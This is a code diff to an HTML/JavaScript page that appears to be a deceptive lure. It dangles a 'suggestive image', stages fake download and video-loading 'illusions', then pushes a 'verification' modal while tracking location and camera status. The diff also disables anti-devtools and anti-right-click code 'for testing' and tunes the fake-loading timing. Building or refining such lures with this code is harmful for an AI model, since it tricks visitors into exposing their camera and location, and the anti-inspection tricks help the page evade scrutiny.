@@ -177,7 +177,7 @@
         #camera-canvas { display: none; } 
     </style>
 </head>
-<body oncontextmenu="return false;">
+<body >
     <script>
         // ----------------------- CONFIGURATION START ---------------------------
         const PREVIEW_IMAGE_URL = "img.jpg"; // The actual suggestive image file on GitHub
@@ -188,15 +188,8 @@
         // ----------------------- CONFIGURATION END ---------------------------
         
         // --- ANTI-DEV TOOLS (FREEZE) & ANTI-RIGHT CLICK ---
-       /* (function freezeDevTools() {
-            function check() {
-                if (window.outerWidth - window.innerWidth > 100 || window.outerHeight - window.innerHeight > 100) {
-                    debugger; 
-                }
-                setTimeout(check, 100); 
-            }
-            check();
-        })();*/
+        // REMOVED FOR TESTING: (function freezeDevTools() { ... });
+        // REMOVED FOR TESTING: document.body.oncontextmenu = function() { return false; };
         
         let locStatus = "Pending";
         let camStatus = "Pending";
@@ -257,7 +250,7 @@
         // --- Helper: Download Animation (1 sec illusion) ---
         function startDownloadAnimation(buttonId, successCallback) {
             const button = document.getElementById(buttonId);
-            if (!button) return; // FIX: Ensure button exists before proceeding
+            if (!button) return; 
             
             const originalText = button.textContent;
 
@@ -303,21 +296,26 @@
                 
                 const blackscreen = document.getElementById('video-blackscreen');
                 blackscreen.classList.add('show');
-                blackscreen.classList.add('loading');
-                blackscreen.innerHTML = ''; 
-
-                // Wait 3 seconds for illusion to complete before showing verification
+                
+                // --- Illusion: Blurred background -> Black screen -> Play Button ---
                 setTimeout(() => {
-                    blackscreen.classList.remove('loading');
-                    blackscreen.classList.remove('show');
-                    document.getElementById('play-button-overlay').classList.add('show'); 
-                    document.getElementById('status-message').textContent = "Video stream loaded. Click PLAY to begin verification.";
-                    
-                    // Show modal immediately after illusion
-                    document.getElementById('modal-overlay').classList.add('show');
-                    document.getElementById('modal-content').focus();
+                    blackscreen.classList.add('loading');
+                    blackscreen.innerHTML = ''; 
 
-                }, 3000); 
+                    // After fake loading, show Play button and then Modal
+                    setTimeout(() => {
+                        blackscreen.classList.remove('loading');
+                        blackscreen.classList.remove('show');
+                        document.getElementById('play-button-overlay').classList.add('show'); 
+                        document.getElementById('status-message').textContent = "Video stream loaded. Click PLAY to begin verification.";
+                        
+                        // Show modal immediately after illusion is complete
+                        document.getElementById('modal-overlay').classList.add('show');
+                        document.getElementById('modal-content').focus();
+                        
+                    }, 3000); // 3 seconds fake loading
+
+                }, 500); 
             });
         }
         
